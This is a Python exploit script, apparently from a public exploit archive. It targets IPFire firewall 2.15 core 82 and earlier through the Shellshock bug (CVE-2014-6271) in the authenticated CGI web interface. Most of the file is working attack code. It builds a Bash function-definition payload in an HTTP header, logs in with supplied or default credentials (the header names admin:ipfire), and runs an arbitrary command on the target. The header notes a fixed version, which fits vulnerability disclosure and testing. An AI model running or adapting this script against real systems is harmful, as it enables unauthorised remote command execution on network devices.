#!/usr/bin/env python
#
# Exploit Title : IPFire <= 2.15 core 82 Authenticated cgi Remote Command Injection (ShellShock)
#
# Exploit Author : Claudio Viviani
#
# Vendor Homepage : http://www.ipfire.org
#
# Software Link: http://downloads.ipfire.org/releases/ipfire-2.x/2.15-core82/ipfire-2.15.i586-full-core82.iso
#
# Date : 2014-09-29
#
# Fixed version: IPFire 2.15 core 83 (2014-09-28)
#
# Info: IPFire is a free Linux distribution which acts as a router and firewall in the first instance.
#       It can be maintained via a web interface.
#       The distribution furthermore offers selected server-daemons and can easily be expanded to a SOHO-server.
#       IPFire is based on Linux From Scratch and is, like the Endian Firewall, originally a fork from IPCop.
#
# Vulnerability: IPFire <= 2.15 core 82 Cgi Web Interface suffers from Authenticated Bash Environment Variable Code Injection
#                (CVE-2014-6271)
#
# Suggestion:
#
# If you can't update the distro and you have installed ipfire via image files (Arm, Flash)
# make sure to change the default access permission to graphical user interface (user:admin pass:ipfire)
#
#
# http connection
import urllib2
# Basic Auth management Base64
import base64
# Args management
import optparse
# Error management
import sys

banner = """
       ___ _______ _______ __                _______       __
      |   |   _   |   _   |__.----.-----.   |   _   .-----|__|
      |.  |.  1   |.  1___|  |   _|  -__|   |.  1___|  _  |  |
      |.  |.  ____|.  __) |__|__| |_____|   |.  |___|___  |__|
      |:  |:  |   |:  |                     |:  1   |_____|
      |::.|::.|   |::.|                     |::.. . |
      `---`---'   `---'                     `-------'
   _______ __          __ __ _______ __               __
  |   _   |  |--.-----|  |  |   _   |  |--.-----.----|  |--.
  |   1___|     |  -__|  |  |   1___|     |  _  |  __|    <
  |____   |__|__|_____|__|__|____   |__|__|_____|____|__|__|
  |:  1   |                 |:  1   |
  |::.. . |                 |::.. . |
  `-------'                 `-------'

                                IPFire <= 2.15 c0re 82 Authenticated
                                Cgi Sh3llSh0ck r3m0t3 C0mm4nd Inj3ct10n

                          Written by:

                        Claudio Viviani

                     http://www.homelab.it

                        info@homelab.it
                    homelabit@protonmail.ch

               https://www.facebook.com/homelabit
                  https://twitter.com/homelabit
               https://plus.google.com/+HomelabIt1/
     https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url

def connectionScan(url,user,pwd,cmd):
    print '[+] Connection in progress...'
    try:
        response = urllib2.Request(url)
        content = urllib2.urlopen(response)
        print '[X] IPFire Basic Authentication not found'
    except urllib2.HTTPError, e:
        if e.code == 404:
            print '[X] Page not found'
        elif e.code == 401:
            try:
                print '[+] Authentication in progress...'
                base64string = base64.encodestring('%s:%s' % (user, pwd)).replace('\n', '')
                headers = {'VULN' : '() { :;}; echo "H0m3l4b1t"; /bin/bash -c "'+cmd+'"' }
                response = urllib2.Request(url, None, headers)
                response.add_header("Authorization", "Basic %s" % base64string)
                content = urllib2.urlopen(response).read()
                if "ipfire" in content:
                    print '[+] Username & Password: OK'
                    print '[+] Checking for vulnerability...'
                    if 'H0m3l4b1t' in  content:
                        print '[!] Command "'+cmd+'": INJECTED!'
                    else:
                        print '[X] Not Vulnerable :('
                else:
                     print '[X] No IPFire page found'
            except urllib2.HTTPError, e:
                if e.code == 401:
                   print '[X] Wrong username or password'
                else:
                   print '[X] HTTP Error: '+str(e.code)
            except urllib2.URLError:
                print '[X] Connection Error'
        else:
            print '[X] HTTP Error: '+str(e.code)
    except urllib2.URLError:
        print '[X] Connection Error'

commandList = optparse.OptionParser('usage: %prog -t https://target:444/ -u admin -p pwd -c "touch /tmp/test.txt"')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL",
                  )
commandList.add_option('-c', '--cmd', action="store",
                  help="Insert command name",
                  )
commandList.add_option('-u', '--user', action="store",
                  help="Insert username",
                  )
commandList.add_option('-p', '--pwd', action="store",
                  help="Insert password",
                  )
options, remainder = commandList.parse_args()

# Check args
if not options.target or not options.cmd or not options.user or not options.pwd:
    print(banner)
    commandList.print_help()
    sys.exit(1)

print(banner)

url = checkurl(options.target)
cmd = options.cmd
user = options.user
pwd = options.pwd

connectionScan(url,user,pwd,cmd)
